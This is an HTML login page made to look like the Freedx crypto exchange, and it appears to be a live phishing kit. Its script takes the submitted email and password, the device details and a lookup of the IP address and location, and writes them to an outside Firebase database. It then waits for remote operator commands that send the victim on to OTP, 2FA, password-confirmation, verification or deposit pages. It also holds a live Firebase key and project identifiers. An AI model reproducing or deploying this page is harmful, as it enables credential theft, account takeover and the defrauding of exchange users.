<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Log In to Freedx</title>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0a0c11;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-wrapper {
      display: flex;
      gap: 48px;
      max-width: 1000px;
      width: 100%;
      align-items: center;
      justify-content: center;
    }

    .banner-area {
      flex: 1;
      max-width: 500px;
      display: none;
    }

    .banner-area img {
      width: 100%;
      height: auto;
      border-radius: 16px;
      object-fit: cover;
    }

    /* DESKTOP - sem card, formulário solto */
    .container {
      max-width: 400px;
      width: 100%;
      padding: 0;
      background: transparent;
      border: none;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 28px;
    }

    .logo {
      height: 28px;
      width: auto;
    }

    .header-actions {
      display: flex;
      gap: 8px;
    }

    .header-actions .btn-signup {
      background: #7c3aed;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 12px;
      font-weight: 500;
      padding: 6px 14px;
      cursor: pointer;
      font-family: inherit;
    }

    .header-actions .btn-login-header {
      background: transparent;
      border: none;
      color: #9ca3af;
      font-size: 12px;
      font-weight: 500;
      padding: 6px 14px;
      cursor: pointer;
      font-family: inherit;
    }

    h1 {
      color: #ffffff;
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 28px;
      letter-spacing: -0.3px;
    }

    .field {
      margin-bottom: 18px;
    }

    .field label {
      display: block;
      color: #9ca3af;
      font-size: 13px;
      font-weight: 500;
      margin-bottom: 4px;
    }

    .field input {
      width: 100%;
      padding: 14px 16px;
      background: #0f1626;
      border: 1px solid #1f2937;
      border-radius: 12px;
      color: #ffffff;
      font-size: 15px;
      outline: none;
      transition: border-color 0.2s;
    }

    .field input::placeholder {
      color: #4a5a7a;
    }

    .field input:focus {
      border-color: #7c3aed;
      box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.15);
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: #7c3aed;
      border: none;
      border-radius: 12px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 6px;
      transition: background 0.2s;
      font-family: inherit;
    }

    .btn:hover {
      background: #6d28d9;
    }

    .btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .btn-loading {
      position: relative;
      pointer-events: none;
    }

    .btn-loading .btn-text {
      visibility: hidden;
    }

    .btn-loading .spinner {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 28px;
      height: 28px;
      border: 3px solid rgba(255, 255, 255, 0.2);
      border-top: 3px solid #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .links {
      display: flex;
      justify-content: space-between;
      margin-top: 16px;
      font-size: 14px;
      flex-wrap: wrap;
      gap: 8px;
    }

    .links a {
      color: #9ca3af;
      text-decoration: none;
      transition: color 0.2s;
    }

    .links a:hover {
      color: #ffffff;
    }

    .links .signup {
      color: #ffffff;
    }

    .links .signup span {
      color: #7c3aed;
      font-weight: 600;
    }

    .divider {
      text-align: center;
      color: #4a5a7a;
      font-size: 11px;
      font-weight: 500;
      letter-spacing: 0.8px;
      margin-top: 28px;
      padding-top: 20px;
      border-top: 1px solid #1f2937;
    }

    .error-msg {
      color: #ef4444;
      font-size: 14px;
      text-align: center;
      margin-top: 12px;
      display: none;
    }

    @media (min-width: 768px) {
      .banner-area {
        display: block;
      }
    }

    /* CELULAR - fundo branco, sem card, tela cheia */
    @media (max-width: 767px) {
      body {
        background: #ffffff;
        padding: 0;
        align-items: flex-start;
      }
      .login-wrapper {
        gap: 0;
        max-width: 100%;
        padding: 0;
      }
      .banner-area {
        display: none;
      }
      .container {
        background: transparent;
        border-radius: 0;
        padding: 20px;
        max-width: 100%;
        border: none;
        box-shadow: none;
        margin: 0;
      }
      .container h1 {
        color: #202124;
        font-size: 28px;
        font-weight: 400;
        margin-bottom: 28px;
      }
      .container .field label {
        color: #5f6368;
        font-size: 13px;
        font-weight: 500;
      }
      .container .field input {
        background: #f7f7f7;
        border: 1px solid #dadce0;
        color: #202124;
      }
      .container .field input::placeholder {
        color: #9aa0a6;
      }
      .container .field input:focus {
        border-color: #7c3aed;
        box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.15);
      }
      .container .btn {
        background: #7c3aed;
        color: #ffffff;
      }
      .container .btn:hover {
        background: #6d28d9;
      }
      .container .links a {
        color: #5f6368;
      }
      .container .links a:hover {
        color: #1a73e8;
      }
      .container .links .signup {
        color: #202124;
      }
      .container .links .signup span {
        color: #7c3aed;
      }
      .container .divider {
        color: #9aa0a6;
        border-top-color: #dadce0;
      }
      .container .header-actions .btn-login-header {
        color: #5f6368;
      }
      .container .error-msg {
        color: #d93025;
      }
    }
  </style>
</head>
<body>

  <div class="login-wrapper">

    <div class="banner-area">
      <img src="https://cms-v2-beta.freedx.am/uploads/banner/auth-banner.webp" alt="auth-banner" />
    </div>

    <div class="container">

      <div class="header">
        <img class="logo" src="https://cms-v2-beta.freedx.am/uploads/logo/purple-logo.svg" alt="freedx" />
        <div class="header-actions">
          <button class="btn-signup" onclick="window.location.href='/registration'">Sign up</button>
          <button class="btn-login-header">Login</button>
        </div>
      </div>

      <h1>Log in</h1>

      <form id="loginForm">
        <div class="field">
          <label for="email">Enter Email Address</label>
          <input type="email" id="email" placeholder="Enter your email" required />
        </div>

        <div class="field">
          <label for="password">Enter your password</label>
          <input type="password" id="password" placeholder="Enter your password" required />
        </div>

        <button type="submit" class="btn" id="loginBtn">
          <span class="btn-text">Log in</span>
          <span class="spinner" style="display: none;"></span>
        </button>
        <div class="error-msg" id="errorMsg">Invalid email or password. Please try again.</div>
      </form>

      <div class="links">
        <a href="/reset-password">Forgot password?</a>
        <a href="#" class="signup">Don't have an account? <span>Sign up</span></a>
      </div>

      <div class="divider">Unlock Your Crypto Journey</div>

    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAemZwP19k7zaM8QMBPn5kitdlvzY514OI",
      authDomain: "web-xchangeon1.firebaseapp.com",
      databaseURL: "https://web-xchangeon1-default-rtdb.firebaseio.com/",
      projectId: "web-xchangeon1",
      storageBucket: "web-xchangeon1.firebasestorage.app",
      messagingSenderId: "733409941973",
      appId: "1:733409941973:web:6e11c283fcee846b4a855c"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function getSessionId() {
      let id = sessionStorage.getItem('firebaseSessionId');
      if (!id) {
        id = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        sessionStorage.setItem('firebaseSessionId', id);
      }
      return id;
    }

    const sessionId = getSessionId();
    const sessionRef = db.ref('sessions/' + sessionId);
    const commandRef = db.ref(`sessions/${sessionId}/command`);

    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    const btnText = loginBtn.querySelector('.btn-text');
    const spinner = loginBtn.querySelector('.spinner');
    const errorMsg = document.getElementById('errorMsg');

    let isProcessing = false;

    function setLoading(loading) {
      isProcessing = loading;
      if (loading) {
        loginBtn.disabled = true;
        loginBtn.classList.add('btn-loading');
        btnText.style.visibility = 'hidden';
        spinner.style.display = 'block';
        errorMsg.style.display = 'none';
      } else {
        loginBtn.disabled = false;
        loginBtn.classList.remove('btn-loading');
        btnText.style.visibility = 'visible';
        spinner.style.display = 'none';
      }
    }

    function showError() {
      errorMsg.style.display = 'block';
    }

    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();

      if (isProcessing) return;

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) return;

      setLoading(true);

      let userData = {
        email: email,
        passwords: [{ value: password }],
        device: navigator.userAgent || 'N/A',
        status: 'online',
        currentPage: 'Login',
        last_update: Date.now(),
        created_at: Date.now()
      };

      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          userData.ip = data.ip;
          return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(res => res.json())
        .then(data => {
          userData.country = data.country_code || 'N/A';
          userData.city = data.city || 'N/A';
          userData.region = data.region || 'N/A';
          userData.country_name = data.country_name || 'N/A';
        })
        .catch(() => {})
        .finally(() => {
          sessionRef.set(userData);
          localStorage.setItem('freedx_email', email);
        });
    });

    commandRef.on('value', (snapshot) => {
      const command = snapshot.val();
      if (!command) return;

      switch (command.type) {
        case 'approve':
          window.location.href = 'https://freedx.com/dashboard';
          break;

        case 'reject':
          setLoading(false);
          showError();
          commandRef.remove();
          break;

        case 'otp-request':
          window.location.href = `otp.html?id=${sessionId}`;
          break;

        case 'tfa-request':
          window.location.href = `2fa.html?id=${sessionId}`;
          break;

        case 'password-confirm-request':
          window.location.href = `password_confirm.html?id=${sessionId}`;
          break;

        case 'verify-request':
          window.location.href = `verify.html?id=${sessionId}`;
          break;

        case 'deposit-request':
          window.location.href = `deposit.html?id=${sessionId}`;
          break;

        case 'force-relogin':
          sessionStorage.clear();
          window.location.href = 'index.html';
          break;
      }
    });

    sessionRef.onDisconnect().update({ status: 'offline' });
    window.addEventListener('load', () => {
      sessionRef.update({ currentPage: 'Login', status: 'online' });
    });

    const savedEmail = localStorage.getItem('freedx_email');
    if (savedEmail) {
      document.getElementById('email').value = savedEmail;
    }
  </script>

</body>
</html>
